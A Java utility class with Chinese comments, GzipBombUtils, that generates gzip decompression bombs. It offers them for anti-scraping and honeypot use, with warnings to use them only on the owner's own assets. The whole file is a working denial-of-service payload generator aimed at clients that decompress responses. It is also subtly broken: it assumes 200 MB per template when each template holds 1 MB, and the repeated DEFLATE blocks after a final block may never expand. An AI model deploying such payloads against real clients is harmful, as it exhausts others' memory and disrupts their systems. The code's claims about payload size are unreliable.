package com.chua.common.support.utils;

import lombok.extern.slf4j.Slf4j;

import java.io.ByteArrayOutputStream;
import java.util.zip.Deflater;

/**
 * Gzip 炸弹工具类:生成高压缩比 DEFLATE 数据,解压后体积指数级膨胀。
 *
 * <p>典型用途:反爬虫/蜜罐系统,诱导盲目解压的客户端耗尽内存。
 * 仅限授权环境使用,部分司法辖区可能视为滥用,使用方需自行评估合规性。</p>
 *
 * <h2>实现原理</h2>
 * <ol>
 *   <li>将 1MB 全零字节以 {@link Deflater#BEST_COMPRESSION} + SYNC_FLUSH 压缩,生成高压缩比模板(约 1KB)</li>
 *   <li>按目标解压体积计算模板重复次数 N</li>
 *   <li>拼接 GZIP 头(10B) + N × 模板 + GZIP 尾(8B),得到最终字节流</li>
 * </ol>
 *
 * <h2>风险与合规</h2>
 * <ul>
 *   <li>本工具可能违反部分司法辖区的计算机滥用相关法律</li>
 *   <li>严禁对未授权的目标投放,蜜罐/反爬虫仅限自有资产使用</li>
 * </ul>
 *
 * @author CH
 * @since 4.0.0.42
 */
@Slf4j
public class GzipBombUtils {

    /**
     * 单个模板解压后体积(MB)。
     */
    private static final int DEFAULT_TEMPLATE_DECOMPRESS_MB = 200;

    /**
     * 单个模板压缩输入大小(B)。
     */
    private static final int TEMPLATE_INPUT_BYTES = 1024 * 1024;

    /**
     * DEFLATE 压缩流读取缓冲区大小(B)。
     */
    private static final int DEFLATE_BUFFER_BYTES = 1024;

    /**
      * 默认生成体积(MB),{@link #generateScalableBomb(Long)} 在 大小mb 为 空/负值时使用。
     */
    private static final long DEFAULT_SIZE_MB = 500L;

    /**
     * 允许的最大目标体积(MB),默认 1,000,000 ≈ 1 TB,超出被截断。
     */
    private static final long MAX_SIZE_MB = 1_000_000L;

    /**
     * GZIP 帧头长度(字节)。
     */
    private static final int GZIP_HEADER_LENGTH = 10;

    /**
     * GZIP 帧尾长度(字节)。
     */
    private static final int GZIP_FOOTER_LENGTH = 8;

    /**
     * 预压缩的 DEFLATE 炸弹模板(1MB 零字节压缩后)。
     * <p>静态初始化,类加载时一次性生成,后续复用。</p>
     */
    private static final byte[] DEFLATE_BOMB_TEMPLATE = createDeflateBombTemplate();

    /**
     * GZIP 头(10 字节):魔数(1F 8B)/压缩方法 08(DEFLATE)/标志 00/时间戳 000000(未设置)/压缩标志 00/OS 03(Unix)。
     * <p>字段定义参见 GZIP 文件格式规范 RFC 1952 §2.2。</p>
     */
    private static final byte[] GZIP_HEADER = new byte[]{
            0x1f, (byte) 0x8b,
            0x08,
            0x00,
            0x00, 0x00, 0x00,
            0x00,
            0x03
    };

    /**
     * GZIP 尾(8 字节):CRC32 + 原始大小(填充 0,客户端校验会失败,但仍会先解压)。
     */
    private static final byte[] GZIP_FOOTER = new byte[GZIP_FOOTER_LENGTH];

    /**
     * gzipbomb工具。
     */
    private GzipBombUtils() {}

    // ============================ 公开 API ============================

    /**
     * 生成可伸缩 Gzip 炸弹数据。
     *
     * @param sizeMb 期望解压后的大小(MB);为 {@code null} 或负值时取默认 500MB;超过 1,000,000MB 截断到上限
     * @return Gzip 字节流(已拼接 GZIP 头/尾)
     */
    public static byte[] generateScalableBomb(Long sizeMb) {
        long target = resolveSizeMb(sizeMb);
        return generateScalableBomb(target);
    }

    /**
     * 生成可伸缩 Gzip 炸弹数据(原始类型重载,避免装箱开销)。
     *
     * @param sizeMb 期望解压后的大小(MB);负值取 0;超过 1,000,000MB 截断到上限;
     *               {@code sizeMb == 0} 时返回仅含 GZIP 头/尾的空载荷(无炸弹效果)
     * @return Gzip 字节流(已拼接 GZIP 头/尾)
     */
    public static byte[] generateScalableBomb(long sizeMb) {
        long target = Math.min(Math.max(sizeMb, 0L), MAX_SIZE_MB);
        int repetitions = (int) Math.ceil((double) target / DEFAULT_TEMPLATE_DECOMPRESS_MB);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.writeBytes(GZIP_HEADER);
        for (int i = 0; i < repetitions; i++) {
            baos.writeBytes(DEFLATE_BOMB_TEMPLATE);
        }
        baos.writeBytes(GZIP_FOOTER);
        byte[] result = baos.toByteArray();
        log.info("Generated Gzip bomb: decompress~{} MB -> {} bytes compressed", target, result.length);
        return result;
    }

    // ============================ 内部实现 ============================

    /**
      * 创建 DEFLATE 炸弹模板:压缩 1MB 全零字节(BEST_COMPRESSION + 同步_FLUSH)。
     *
     * @return DEFLATE 压缩模板字节
     */
    private static byte[] createDeflateBombTemplate() {
        Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION, true);
        byte[] input = new byte[TEMPLATE_INPUT_BYTES];
        deflater.setInput(input);
        deflater.finish();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[DEFLATE_BUFFER_BYTES];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer, 0, buffer.length, Deflater.SYNC_FLUSH);
            baos.write(buffer, 0, count);
        }
        deflater.end();
        return baos.toByteArray();
    }

    /**
     * 解析最终目标体积(MB)。
     *
     * @param sizeMb 原始入参,可空
     * @return 合法目标体积(MB):为 空/负 → {@link #DEFAULT_SIZE_MB};否则上限截断到 {@link #MAX_SIZE_MB}
     */
    private static long resolveSizeMb(Long sizeMb) {
        if (null == sizeMb || sizeMb < 0L) {
            return DEFAULT_SIZE_MB;
        }
        return Math.min(sizeMb, MAX_SIZE_MB);
    }

    /**
     * 当前 GZIP 头长度,用于构造/校验。
     *
     * @return 固定 10
     */
    public static int gzipHeaderLength() {
        return GZIP_HEADER_LENGTH;
    }

    /**
     * 当前 GZIP 尾长度,用于构造/校验。
     *
     * @return 固定 8
     */
    public static int gzipFooterLength() {
        return GZIP_FOOTER_LENGTH;
    }
}
